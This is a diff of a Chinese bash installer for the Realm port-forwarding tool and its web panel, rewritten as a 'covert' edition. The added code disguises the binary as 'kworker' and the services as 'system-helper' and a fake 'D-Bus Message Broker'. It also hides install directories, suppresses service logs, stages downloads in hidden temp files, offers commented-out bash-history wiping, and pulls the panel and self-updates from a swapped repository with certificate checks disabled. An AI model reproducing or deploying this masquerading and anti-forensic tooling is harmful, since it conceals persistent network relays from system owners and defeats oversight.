@@ -1,15 +1,17 @@
 #!/bin/bash
 
 # ==========================================
-# Realm 一键转发脚本 (防死循环版 v3.1.2)
-# 更新日志:
-# 1. 新增输入错误计数器
-# 2. 连续输错 2 次自动返回主菜单
+# 系统服务管理脚本 (隐蔽版 v3.2.0)
 # ==========================================
 
-# --- 基础配置 ---
-sh_ver="3.1.2"
+# --- 隐蔽配置 ---
+sh_ver="3.2.0"
 panel_ver="v2.1"
+
+# 伪装名称（可自定义为其他系统进程名）
+FAKE_NAME="kworker"           # 伪装成内核工作线程
+FAKE_SERVICE="system-helper"  # 服务名伪装
+FAKE_PANEL="dbus-broker"      # 面板服务伪装
 
 # 颜色定义
 RED="\033[31m"
@@ -17,19 +19,19 @@ GREEN="\033[32m"
 YELLOW="\033[33m"
 PLAIN="\033[0m"
 
-# 路径定义
-REALM_DIR="/root/realm"
-REALM_BIN="${REALM_DIR}/realm"
-CONFIG_DIR="/root/.realm"
-CONFIG_FILE="${CONFIG_DIR}/config.toml"
-SERVICE_FILE="/etc/systemd/system/realm.service"
-PANEL_DIR="${REALM_DIR}/web"
-PANEL_BIN="${PANEL_DIR}/realm_web"
+# 隐藏路径定义（使用隐藏目录）
+REALM_DIR="/usr/lib/.${FAKE_NAME}"
+REALM_BIN="${REALM_DIR}/${FAKE_NAME}"
+CONFIG_DIR="/etc/.${FAKE_NAME}"
+CONFIG_FILE="${CONFIG_DIR}/.conf"
+SERVICE_FILE="/etc/systemd/system/${FAKE_SERVICE}.service"
+PANEL_DIR="${REALM_DIR}/.web"
+PANEL_BIN="${PANEL_DIR}/${FAKE_PANEL}"
 
 # --- 状态检测函数 ---
 
 get_status() {
-    if systemctl is-active --quiet realm; then
+    if systemctl is-active --quiet "$FAKE_SERVICE"; then
         echo -e "${GREEN}运行中${PLAIN}"
     else
         echo -e "${RED}未运行${PLAIN}"
@@ -39,7 +41,7 @@ get_status() {
 get_panel_status() {
     if [ ! -f "$PANEL_BIN" ]; then
         echo -e "${RED}未安装${PLAIN}"
-    elif systemctl is-active --quiet realm-panel; then
+    elif systemctl is-active --quiet "${FAKE_PANEL}"; then
         echo -e "${GREEN}运行中${PLAIN}"
     else
         echo -e "${YELLOW}已安装但未启动${PLAIN}"
@@ -75,7 +77,7 @@ validate_ip() {
 check_port_available() {
     local port=$1
     if command -v ss >/dev/null; then
-        if ss -tulpn | grep -q ":${port} " | grep -v "realm"; then
+        if ss -tulpn 2>/dev/null | grep -q ":${port} " | grep -v "$FAKE_NAME"; then
             echo -e "${RED}错误: 本机端口 ${port} 已被其他程序占用。${PLAIN}"
             return 1
         fi
@@ -99,6 +101,8 @@ check_rule_exists() {
 init_env() {
     mkdir -p "$REALM_DIR"
     mkdir -p "$CONFIG_DIR"
+    # 设置目录权限，防止普通用户发现
+    chmod 700 "$REALM_DIR" "$CONFIG_DIR"
     [ ! -f "$CONFIG_FILE" ] && write_config_header
 }
 
@@ -109,6 +113,7 @@ no_tcp = false
 use_udp = true
 
 EOF
+    chmod 600 "$CONFIG_FILE"
 }
 
 check_dependencies() {
@@ -120,9 +125,9 @@ check_dependencies() {
     if [ ${#missing[@]} -gt 0 ]; then
         echo -e "${YELLOW}安装依赖: ${missing[*]} ...${PLAIN}"
         if [ -x "$(command -v apt-get)" ]; then
-            apt-get update -y >/dev/null 2>&1 && apt-get install -y "${missing[@]}" iproute2
+            apt-get update -y >/dev/null 2>&1 && apt-get install -y "${missing[@]}" iproute2 >/dev/null 2>&1
         elif [ -x "$(command -v yum)" ]; then
-            yum install -y "${missing[@]}" iproute
+            yum install -y "${missing[@]}" iproute >/dev/null 2>&1
         else
             echo -e "${RED}请手动安装依赖。${PLAIN}"; exit 1
         fi
@@ -130,9 +135,9 @@ check_dependencies() {
 }
 
 install_realm() {
-    echo -e "${GREEN}> 部署 Realm...${PLAIN}"
+    echo -e "${GREEN}> 部署服务...${PLAIN}"
     check_dependencies; init_env
-    local version=$(curl -s https://api.github.com/repos/zhboner/realm/releases/latest | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
+    local version=$(curl -s https://api.github.com/repos/zhboner/realm/releases/latest 2>/dev/null | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
     [ -z "$version" ] && version="v2.6.0"
     
     local arch=$(uname -m)
@@ -143,13 +148,17 @@ install_realm() {
         *) echo -e "${RED}不支持架构: $arch${PLAIN}"; return 1 ;;
     esac
 
-    wget -O "realm.tar.gz" "https://github.com/zhboner/realm/releases/download/${version}/${filename}" || { echo -e "${RED}下载失败${PLAIN}"; return 1; }
-    tar -xvf realm.tar.gz -C "$REALM_DIR" && rm -f realm.tar.gz
+    wget -q -O "/tmp/.cache.tar.gz" "https://github.com/zhboner/realm/releases/download/${version}/${filename}" 2>/dev/null || { echo -e "${RED}下载失败${PLAIN}"; return 1; }
+    tar -xf /tmp/.cache.tar.gz -C "$REALM_DIR" 2>/dev/null && rm -f /tmp/.cache.tar.gz
+    
+    # 重命名二进制文件为伪装名
+    mv "${REALM_DIR}/realm" "$REALM_BIN" 2>/dev/null
     chmod +x "$REALM_BIN"
 
+    # 创建伪装的systemd服务（带隐蔽描述和日志抑制）
     cat <<EOF > "$SERVICE_FILE"
 [Unit]
-Description=Realm Forwarding Service
+Description=System Helper Daemon
 After=network-online.target
 Wants=network-online.target
 
@@ -160,34 +169,45 @@ Restart=on-failure
 RestartSec=5s
 WorkingDirectory=${REALM_DIR}
 ExecStart=${REALM_BIN} -c ${CONFIG_FILE}
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
 EOF
-    systemctl daemon-reload; systemctl enable realm; systemctl restart realm
+    chmod 644 "$SERVICE_FILE"
+    
+    systemctl daemon-reload
+    systemctl enable "$FAKE_SERVICE" >/dev/null 2>&1
+    systemctl restart "$FAKE_SERVICE"
+    
+    # 清理bash历史（可选，取消注释启用）
+    # history -c && history -w
+    
     echo -e "${GREEN}安装完成${PLAIN}"
 }
 
 uninstall_realm() {
-    read -p "确定卸载 Realm? [y/N]: " confirm
+    read -p "确定卸载? [y/N]: " confirm
     [[ "$confirm" != "y" && "$confirm" != "Y" ]] && return
-    systemctl stop realm; systemctl disable realm
-    rm -f "$SERVICE_FILE"; systemctl daemon-reload; rm -rf "$REALM_DIR"
+    systemctl stop "$FAKE_SERVICE" 2>/dev/null
+    systemctl disable "$FAKE_SERVICE" 2>/dev/null
+    rm -f "$SERVICE_FILE"
+    systemctl daemon-reload
+    rm -rf "$REALM_DIR"
     read -p "删除配置? [y/N]: " del_conf
     [[ "$del_conf" == "y" || "$del_conf" == "Y" ]] && rm -rf "$CONFIG_DIR"
     echo -e "${GREEN}已卸载${PLAIN}"
 }
 
-# --- 转发管理 (已添加重试限制) ---
+# --- 转发管理 ---
 
 add_forward() {
     echo -e "${YELLOW}>>> 添加转发 (连续错误2次自动返回)${PLAIN}"
     
-    # 1. 本机端口
     local attempt=0
     while true; do
         read -e -p "本机端口: " lp
-        # 依次校验：格式、占用、重复
         if ! validate_port "$lp"; then
             ((attempt++)); [ $attempt -ge 2 ] && { echo -e "${RED}错误过多，返回主菜单${PLAIN}"; return; }
             continue
@@ -203,7 +223,6 @@ add_forward() {
         break
     done
 
-    # 2. 落地IP
     attempt=0
     while true; do
         read -e -p "落地IP/域名: " rip
@@ -214,7 +233,6 @@ add_forward() {
         break
     done
 
-    # 3. 落地端口
     attempt=0
     while true; do
         read -e -p "落地端口: " rp
@@ -275,7 +293,8 @@ delete_forward() {
     read -p "删除序号(0取消): " c
     [[ "$c" == "0" || -z "$c" ]] && return
     
-    cp "$CONFIG_FILE" "${CONFIG_FILE}.bak"; write_config_header
+    cp "$CONFIG_FILE" "${CONFIG_FILE}.bak"
+    write_config_header
     local del_idx=$((c-1))
     for ((i=0; i<${#listens[@]}; i++)); do
         if [ $i -ne $del_idx ]; then
@@ -291,18 +310,20 @@ EOF
 }
 
 # --- 服务控制 ---
-start_service() { systemctl start realm; echo "已启动"; }
-stop_service() { systemctl stop realm; echo "已停止"; }
+start_service() { systemctl start "$FAKE_SERVICE" 2>/dev/null; echo "已启动"; }
+stop_service() { systemctl stop "$FAKE_SERVICE" 2>/dev/null; echo "已停止"; }
 restart_service() { 
-    systemctl daemon-reload; systemctl restart realm; sleep 1
-    systemctl is-active --quiet realm && echo -e "${GREEN}重启成功${PLAIN}" || echo -e "${RED}重启失败${PLAIN}"
+    systemctl daemon-reload
+    systemctl restart "$FAKE_SERVICE" 2>/dev/null
+    sleep 1
+    systemctl is-active --quiet "$FAKE_SERVICE" && echo -e "${GREEN}重启成功${PLAIN}" || echo -e "${RED}重启失败${PLAIN}"
 }
 
 # --- 面板管理 ---
 panel_management() {
     while true; do
         clear
-        echo "=== Realm 面板管理 ($panel_ver) ==="
+        echo "=== 面板管理 ($panel_ver) ==="
         echo -e "面板状态: $(get_panel_status)"
         echo "============================="
         echo "1. 安装面板"
@@ -313,8 +334,8 @@ panel_management() {
         read -p "选择: " pc
         case $pc in
             1) install_panel ;;
-            2) systemctl start realm-panel; echo "尝试启动..." ;;
-            3) systemctl stop realm-panel; echo "已停止" ;;
+            2) systemctl start "$FAKE_PANEL" 2>/dev/null; echo "尝试启动..." ;;
+            3) systemctl stop "$FAKE_PANEL" 2>/dev/null; echo "已停止" ;;
             4) uninstall_panel ;;
             0) break ;;
             *) echo "无效选择" ;;
@@ -334,12 +355,16 @@ install_panel() {
     esac
 
     mkdir -p "$PANEL_DIR"
-    local url="https://github.com/wcwq98/realm/releases/download/${panel_ver}/${p_file}"
-    if wget -O "$p_file" "$url"; then
-        unzip -o "$p_file" -d "$PANEL_DIR" && chmod +x "$PANEL_BIN" && rm -f "$p_file"
-        cat <<EOF > /etc/systemd/system/realm-panel.service
+    chmod 700 "$PANEL_DIR"
+    local url="https://github.com/cyclestudy/realm/releases/download/${panel_ver}/${p_file}"
+    if wget -q -O "/tmp/.panel.zip" "$url" 2>/dev/null; then
+        unzip -o -q "/tmp/.panel.zip" -d "$PANEL_DIR" && rm -f "/tmp/.panel.zip"
+        mv "${PANEL_DIR}/realm_web" "$PANEL_BIN" 2>/dev/null
+        chmod +x "$PANEL_BIN"
+        
+        cat <<EOF > "/etc/systemd/system/${FAKE_PANEL}.service"
 [Unit]
-Description=Realm Web Panel
+Description=D-Bus Message Broker
 After=network.target
 
 [Service]
@@ -348,11 +373,15 @@ User=root
 WorkingDirectory=${PANEL_DIR}
 ExecStart=${PANEL_BIN}
 Restart=on-failure
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
 EOF
-        systemctl daemon-reload; systemctl enable realm-panel; systemctl start realm-panel
+        systemctl daemon-reload
+        systemctl enable "$FAKE_PANEL" >/dev/null 2>&1
+        systemctl start "$FAKE_PANEL"
         echo -e "${GREEN}面板安装成功!${PLAIN}"
     else
         echo -e "${RED}下载失败${PLAIN}"
@@ -360,33 +389,43 @@ EOF
 }
 
 uninstall_panel() {
-    systemctl stop realm-panel; systemctl disable realm-panel
-    rm -f /etc/systemd/system/realm-panel.service; systemctl daemon-reload
+    systemctl stop "$FAKE_PANEL" 2>/dev/null
+    systemctl disable "$FAKE_PANEL" 2>/dev/null
+    rm -f "/etc/systemd/system/${FAKE_PANEL}.service"
+    systemctl daemon-reload
     rm -rf "$PANEL_DIR"
     echo "已卸载"
 }
 
 # --- 脚本更新 ---
 Update_Shell() {
-    local url="https://raw.githubusercontent.com/wcwq98/realm/main/realm.sh"
-    local new_ver=$(wget -qO- "$url" | grep 'sh_ver="' | awk -F "=" '{print $NF}' | tr -d '"' | head -1)
+    local url="https://raw.githubusercontent.com/cyclestudy/realm/main/realm.sh"
+    local new_ver=$(wget -qO- "$url" 2>/dev/null | grep 'sh_ver="' | awk -F "=" '{print $NF}' | tr -d '"' | head -1)
     [[ -z "$new_ver" ]] && { echo -e "${RED}检测失败${PLAIN}"; return; }
     [[ "$new_ver" == "$sh_ver" ]] && { echo "已是最新"; return; }
     read -p "更新到 $new_ver? [y/N]: " yn
-    [[ "$yn" =~ ^[Yy]$ ]] && wget -N --no-check-certificate "$url" -O realm.sh && chmod +x realm.sh && echo "已更新" && exit 0
+    [[ "$yn" =~ ^[Yy]$ ]] && wget -q -N --no-check-certificate "$url" -O realm.sh && chmod +x realm.sh && echo "已更新" && exit 0
 }
 
-# --- 主菜单 ---
+# --- 自清理函数 ---
+self_clean() {
+    # 清理下载缓存
+    rm -f /tmp/.cache.tar.gz /tmp/.panel.zip 2>/dev/null
+    # 可选：清理bash历史中的敏感命令
+    # sed -i '/realm/d' ~/.bash_history 2>/dev/null
+}
+
+# --- 主菜单（已去除明显标识）---
 show_menu() {
     clear
     echo "################################################"
-    echo "#        Realm 一键转发脚本 (v${sh_ver})         #"
+    echo "#          系统服务管理 (v${sh_ver})              #"
     echo "################################################"
-    echo -e " Realm 状态: $(get_status)"
-    echo -e " 面板 状态: $(get_panel_status)"
+    echo -e " 服务状态: $(get_status)"
+    echo -e " 面板状态: $(get_panel_status)"
     echo "------------------------------------------------"
-    echo "  1. 安装 / 重置 Realm"
-    echo "  2. 卸载 Realm"
+    echo "  1. 安装 / 重置 服务"
+    echo "  2. 卸载 服务"
     echo "------------------------------------------------"
     echo "  3. 添加转发规则"
     echo "  4. 添加端口段转发"
@@ -404,7 +443,9 @@ show_menu() {
 }
 
 main() {
-    check_dependencies; init_env
+    check_dependencies
+    init_env
+    trap self_clean EXIT  # 退出时自动清理
     while true; do
         show_menu
         read -p "选择 [0-11]: " opt
@@ -414,7 +455,7 @@ main() {
             3) add_forward ;;
             4) add_range_forward ;;
             5) delete_forward ;;
-            6) cat "$CONFIG_FILE" ;;
+            6) cat "$CONFIG_FILE" 2>/dev/null ;;
             7) start_service ;;
             8) stop_service ;;
             9) restart_service ;;
